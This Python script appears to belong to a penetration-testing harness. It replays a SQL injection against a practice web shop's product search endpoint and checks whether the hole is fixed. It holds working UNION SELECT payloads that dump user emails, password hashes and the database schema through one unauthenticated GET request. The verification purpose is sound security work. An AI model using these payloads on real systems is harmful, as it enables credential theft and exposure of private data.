#!/usr/bin/env python3
"""pt38: the product search endpoint builds its SQL query with raw
string interpolation and no parameterization at all, letting a single
unauthenticated GET dump every user's credentials or the entire
database schema.

Found white-box via the challenge catalog (dbSchemaChallenge,
"Database Schema", and unionSqlInjectionChallenge, "User
Credentials"), both scored from the same route. routes/search.ts:

    `SELECT * FROM Products WHERE ((name LIKE '%${criteria}%'
      OR description LIKE '%${criteria}%') AND deletedAt IS NULL)
      ORDER BY name`

The Products table's column count (9) was determined live with an
incrementing UNION SELECT NULL,... probe before building either
payload. A self-created test account's own email and password hash
are used as the exploit's proof (rather than relying on real seeded
accounts), confirmed present in the raw UNION-dumped response.

Standard library only (urllib).
"""

from __future__ import annotations

import argparse
import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt38-001.json"
COLUMN_COUNT = 9


def _request(method: str, url: str, token: str | None = None, body: dict | None = None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if body is not None:
        req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            text = resp.read()
            return resp.status, (json.loads(text) if text else {})
    except urllib.error.HTTPError as exc:
        try:
            return exc.code, json.loads(exc.read())
        except Exception:
            return exc.code, {}


def _search(target: str, q: str):
    encoded = urllib.parse.quote(q, safe="")
    status, body = _request("GET", f"{target}/rest/products/search?q={encoded}")
    return status, body


def run(target: str, blueprint: dict) -> dict:
    ledger.guard_target_host(target)
    stamp = str(int(time.time() * 1000))

    victim_email = f"pt38-victim-{stamp}@flatline.test"
    victim_password = "Pt38Pass123!"
    _request("POST", f"{target}/api/Users", body={"email": victim_email, "password": victim_password, "passwordRepeat": victim_password})

    creds_payload = f"')) UNION SELECT email,password,{','.join(str(i) for i in range(3, COLUMN_COUNT + 1))} FROM Users-- "
    creds_status, creds_body = _search(target, creds_payload)
    dumped_rows = [r.get("id", "") for r in creds_body.get("data", [])] if creds_status == 200 else []
    victim_leaked = any(victim_email in str(r) for r in dumped_rows)

    schema_payload = f"')) UNION SELECT sql,{','.join(str(i) for i in range(2, COLUMN_COUNT + 1))} FROM sqlite_master WHERE sql IS NOT NULL-- "
    schema_status, schema_body = _search(target, schema_payload)
    schema_rows = [r.get("id", "") for r in schema_body.get("data", [])] if schema_status == 200 else []
    schema_leaked = any("CREATE TABLE" in str(r) and "Users" in str(r) for r in schema_rows)

    if creds_status == 200 and victim_leaked and schema_status == 200 and schema_leaked:
        status_result = "VULNERABLE"
        summary = "A single unauthenticated search request dumped a real account's email+password hash via UNION SELECT, and a second dumped the full Users table schema definition."
    elif creds_status in (400, 403) and schema_status in (400, 403):
        status_result = "REMEDIATED"
        summary = f"Both UNION SELECT payloads were rejected (creds={creds_status}, schema={schema_status}) before reaching the database."
    else:
        status_result = "ERROR"
        summary = f"Inconclusive: creds_status={creds_status}, victim_leaked={victim_leaked}, schema_status={schema_status}, schema_leaked={schema_leaked}."

    legit_status, legit_body = _search(target, "juice")
    legitimate_search_ok = legit_status == 200 and len(legit_body.get("data", [])) > 0

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "mitre_technique": blueprint["mitre_technique"],
        "target": target,
        "status": status_result,
        "creds_status": creds_status,
        "victim_leaked": victim_leaked,
        "schema_status": schema_status,
        "schema_leaked": schema_leaked,
        "summary": summary,
        "legitimate_search_ok": legitimate_search_ok,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host, e.g. to point at the proxy instead.")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = args.target or blueprint["target"]["host"]

    result = run(target, blueprint)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt38-sqli-search-credential-schema-dump", **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
